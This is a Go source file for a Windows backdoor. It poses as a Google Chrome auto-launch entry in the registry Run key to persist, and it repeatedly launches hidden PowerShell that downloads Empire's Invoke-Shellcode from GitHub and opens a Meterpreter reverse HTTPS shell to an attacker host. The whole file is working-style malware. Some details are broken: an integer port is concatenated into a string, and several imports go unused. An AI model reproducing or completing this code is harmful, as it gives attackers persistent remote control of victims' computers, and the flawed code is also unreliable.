package main

import (
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows/registry"
	"net"
)

const (
	NO_IP_HOST  = "googlechromeauto.serveirc.com"
	LHOST       = "192.168.1.3"
	LPORT       = 443
	TIME_SLEEP  = 10
	TEMP_PATH   = "C:\\Temp"
	REG_PATH    = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	REG_NAME    = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
	REG_VALUE   = `"` + TEMP_PATH + `\\GoogleChromeAutoLaunch.exe" --no-startup-window /prefetch:5`
)

var (
	modwininet = syscall.NewLazyDLL("wininet.dll")
)

func setRegKeyValue(regPath string, name string, value string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.ALL_ACCESS)
	if err != nil {
		log.Println(err)
		return
	}
	defer k.Close()

	err = k.SetStringValue(name, value)
	if err != nil {
		log.Println(err)
	}
}

func fire() {
	if NO_IP_HOST != "" {
		// Check if no-ip is online or not
		// getNoipIpAddress()
	}

	powershellCmd := "powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost " + LHOST + " -Lport " + LPORT + " -Force;"

	cmd := exec.Command("powershell", "-command", powershellCmd)
	err := cmd.Run()
	if err != nil {
		log.Println(err)
	}
}

func runAfterClose() {
	foundIT := false
	output, err := exec.Command("tasklist").Output()
	if err != nil {
		log.Println(err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "powershell.exe") {
			foundIT = true
			break
		}
	}

	if !foundIT {
		fire()
	}
}

func getNoipIpAddress() {
	// Implementation for getting the IP address using DNS resolving in Go
}

func main() {
	fire()
	time.Sleep(5 * time.Second)
	setRegKeyValue(REG_PATH, REG_NAME, REG_VALUE)

	for {
		runAfterClose()
		time.Sleep(TIME_SLEEP * time.Second)
	}
}
